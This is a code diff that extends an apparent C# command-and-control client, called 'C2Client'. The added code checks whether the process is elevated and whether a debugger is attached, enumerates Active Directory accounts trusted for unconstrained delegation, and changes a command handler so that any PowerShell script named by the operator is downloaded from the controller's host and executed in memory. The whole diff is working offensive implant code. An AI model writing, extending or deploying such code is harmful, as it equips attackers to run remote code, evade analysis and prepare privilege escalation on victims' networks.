@@ -20,11 +20,93 @@ using System.Security.Principal;
 using System.Security.AccessControl;
 using Microsoft.Win32;
 using System.Reflection;
+using System.Runtime.InteropServices;
+using System.Diagnostics;
 
 namespace C2Client
 {
     class Program
     {
+        public enum TOKEN_INFORMATION_CLASS
+        {
+            TokenUser = 1,
+            TokenGroups,
+            TokenPrivileges,
+            TokenOwner,
+            TokenPrimaryGroup,
+            TokenDefaultDacl,
+            TokenSource,
+            TokenType,
+            TokenImpersonationLevel,
+            TokenStatistics,
+            TokenRestrictedSids,
+            TokenSessionId,
+            TokenGroupsAndPrivileges,
+            TokenSessionReference,
+            TokenSandBoxInert,
+            TokenAuditPolicy,
+            TokenOrigin,
+            TokenElevationType,
+            TokenLinkedToken,
+            TokenElevation,
+            TokenHasRestrictions,
+            TokenAccessInformation,
+            TokenVirtualizationAllowed,
+            TokenVirtualizationEnabled,
+            TokenIntegrityLevel,
+            TokenUIAccess,
+            TokenMandatoryPolicy,
+            TokenLogonSid,
+            TokenIsAppContainer,
+            TokenCapabilities,
+            TokenAppContainerSid,
+            TokenAppContainerNumber,
+            TokenUserClaimAttributes,
+            TokenDeviceClaimAttributes,
+            TokenRestrictedUserClaimAttributes,
+            TokenRestrictedDeviceClaimAttributes,
+            TokenDeviceGroups,
+            TokenRestrictedDeviceGroups,
+            TokenSecurityAttributes,
+            TokenIsRestricted,
+            TokenProcessTrustLevel,
+            TokenPrivateNameSpace,
+            TokenSingletonAttributes,
+            TokenBnoIsolation,
+            TokenChildProcessFlags,
+            TokenIsLessPrivilegedAppContainer,
+            TokenIsSandboxed,
+            MaxTokenInfoClass
+        }
+
+
+        [DllImport("Advapi32.dll")]
+        public static extern bool OpenProcessToken(
+            IntPtr ProcessHandle,
+            UInt32 DesiredAccess,
+            ref IntPtr TokenHandle
+            );
+
+        [DllImport("Advapi32.dll")]
+        public static extern bool GetTokenInformation(
+            IntPtr tokenhandle,
+            TOKEN_INFORMATION_CLASS TokenInformationClass,
+            IntPtr TokenInformation,
+            int TokenInformationLength,
+            ref int ReturnLength
+            );
+        [StructLayout(LayoutKind.Sequential)]
+        public struct TOKEN_ELEVATION
+        {
+            public UInt32 TokenIsElevated;
+        }
+
+        [DllImport("Kernel32.dll")]
+        public static extern bool CloseHandle(IntPtr handle);
+
+
+        [DllImport("Kernel32.dll")]
+        public static extern bool IsDebuggerPresent();
 
         public string GetResult(string cmd)
         {
@@ -325,7 +407,9 @@ namespace C2Client
             ps.Stop();
             r.Close();
             // Thread.Sleep(4000);
+            sw.WriteLine("Executed successfully");
             result += sw.ToString();
+            
             Console.WriteLine("---------------result-------");
             Console.WriteLine(result);
             return result;
@@ -370,7 +454,7 @@ namespace C2Client
                 DirectoryEntry de = new DirectoryEntry("LDAP://" + domainDN);
                 DirectorySearcher ds = new DirectorySearcher();
                 ds.SearchRoot = de;
-
+                
                 foreach (SearchResult sr in ds.FindAll())
                 {
                     try
@@ -385,6 +469,7 @@ namespace C2Client
 
                                 foreach (DictionaryEntry d in ht)
                                 {
+                                    
                                     if (d.Value.ToString() == a.ObjectType.ToString())
                                     {
                                         sw.WriteLine(a.IdentityReference);
@@ -801,6 +886,83 @@ namespace C2Client
             catch { }
         }
 
+
+        public string GetUnconstrainedDelegation(string domainname)
+        {
+            string res = "";
+
+            StringWriter sw = new StringWriter();
+            try
+            {
+
+                List<string> l = new List<string>();
+                l.Add(""); l.Add("ACCOUNTDISABLE"); l.Add(""); l.Add("HOMEDIR_REQUIRED");
+                l.Add("LOCKOUT"); l.Add("PASSWD_NOTREQD"); l.Add("PASSWD_CANT_CHANGE");
+                l.Add("ENCRYPTED_TEXT_PWD_ALLOWED"); l.Add("TEMP_DUPLICATE_ACCOUNT");
+                l.Add("NORMAL_ACCOUNT"); l.Add(""); l.Add("INTERDOMAIN_TRUST_ACCOUNT");
+                l.Add("WORKSTATION_TRUST_ACCOUNT"); l.Add("SERVER_TRUST_ACCOUNT"); l.Add(""); l.Add("");
+                l.Add("DONT_EXPIRE_PASSWORD"); l.Add("MNS_LOGON_ACCOUNT");
+                l.Add("SMARTCARD_REQUIRED"); l.Add("TRUSTED_FOR_DELEGATION");
+                l.Add("NOT_DELEGATED"); l.Add("USE_DES_KEY_ONLY");
+                l.Add("DONT_REQ_PREAUTH"); l.Add("PASSWORD_EXPIRED");
+                l.Add("TRUSTED_TO_AUTH_FOR_DELEGATION");
+
+                
+                string DomainName = domainname;
+                // testing.tech69.local
+                string[] domain = DomainName.Split('.');
+                for (int i = 0; i < domain.Length; i++)
+                {
+                    domain[i] = "DC=" + domain[i];
+                }
+                string dn = String.Join(",", domain);
+
+                DirectoryEntry de = new DirectoryEntry(String.Format("LDAP://{0}", dn));
+                DirectorySearcher ds = new DirectorySearcher();
+                ds.SearchRoot = de;
+                ds.Filter = "(&(objectclass=user)(useraccountcontrol>=524288))";
+
+                foreach (SearchResult sr in ds.FindAll())
+                {
+                    //Console.WriteLine(sr.Properties["samaccountname"][0]);
+                    // sw.WriteLine(sr.Properties["useraccountcontrol"][0]);
+                    int uac = Convert.ToInt32(sr.Properties["useraccountcontrol"][0]);
+                    string uac_binary = Convert.ToString(uac, 2);
+                    List<string> flags = new List<string>();
+                    //Console.WriteLine(l.Count);
+                    //Console.WriteLine(uac_binary.Length);
+                    for (int i = 0; i < uac_binary.Length; i++)
+                    {
+                        int result2 = uac & Convert.ToInt32(Math.Pow(2, i));
+                        if (result2 != 0)
+                        {
+                            //Console.WriteLine(l[i]);
+                            flags.Add(l[i]);
+                        }
+
+                    }
+                    foreach (string temp in flags)
+                    {
+                        if (temp.ToLower().Contains("deleg"))
+                        {
+                            sw.WriteLine("Name: {0}", sr.Properties["samaccountname"][0]);
+                            foreach (string temp2 in flags)
+                            {
+                                sw.WriteLine(temp2);
+                            }
+                        }
+                    }
+
+                }
+                res = sw.ToString();
+            }
+            catch(Exception e)
+            {
+                res = e.Message;
+            }
+                return res;
+        }
+
         public static void Main(string[] args)
         {
             if (args.Length != 4)
@@ -952,10 +1114,13 @@ namespace C2Client
 
                     }
 
-                    else if (cmd == "powerup")
+                    else if (cmd.Contains("RUNPSSCRIPT-"))
                     {
+
+                        string[] command = cmd.Split('-');
+                        string filename = command[1];
                         //get powerupps1 and execute in memory
-                        string url = String.Format("http://{0}:{1}/powerup.ps1", args[2], args[3]);
+                        string url = String.Format("http://{0}:{1}/{2}", args[2], args[3],filename);
                         Program p = new Program();
                         Thread runpsscript = new Thread(() => { cmd = p.RunPSScript(url); });
                         //cmd = p.RunPSScript(url);
@@ -1133,6 +1298,63 @@ namespace C2Client
                         loadurl.Start();
                         cmd = "Started Loading from url...";
                     }
+                    
+                    else if (cmd == "Check-ProcessElevation")
+                    {
+
+                        IntPtr procHandle = Process.GetCurrentProcess().Handle;
+                        IntPtr tokenhandle = IntPtr.Zero;
+                        bool res =OpenProcessToken(procHandle, 0x0008, ref tokenhandle);
+
+                        IntPtr tokenelevated = Marshal.AllocHGlobal(4);
+                        int elevatedlength = 4;
+                        bool res2 =GetTokenInformation(
+                            tokenhandle,
+                            TOKEN_INFORMATION_CLASS.TokenElevation,
+                            tokenelevated,
+                            4,
+                            ref elevatedlength
+                            );
+
+                        TOKEN_ELEVATION te = (TOKEN_ELEVATION)Marshal.PtrToStructure(tokenelevated, typeof(TOKEN_ELEVATION));
+                        if (te.TokenIsElevated != 0)
+                        {
+                            Console.WriteLine(te.TokenIsElevated);
+                            cmd = "Have Elevated Privileges";
+                        }
+                        else
+                        {
+                            cmd = "Doesnot have elevated privileges";
+                        }
+                        Console.WriteLine(cmd);
+                        //CloseHandle(procHandle);
+                        CloseHandle(tokenhandle);
+                    }
+
+                    else if (cmd == "ISDEBUGGERPRESENT")
+                    {
+
+                        if (IsDebuggerPresent() == true)
+                        {
+                            cmd = "Debugger is attached";
+                        }
+                        else
+                        {
+                            cmd = "No debugger is attached";
+                        }
+
+                    }
+
+                    else if (cmd == "Get-UnconstrainedDelegation")
+                    {
+                        Domain d = Domain.GetCurrentDomain();
+                        string domainname = d.Name.ToString();
+
+                        Program p = new Program();
+                        cmd = p.GetUnconstrainedDelegation(domainname);
+
+                    }
+
 
                     else
                     {
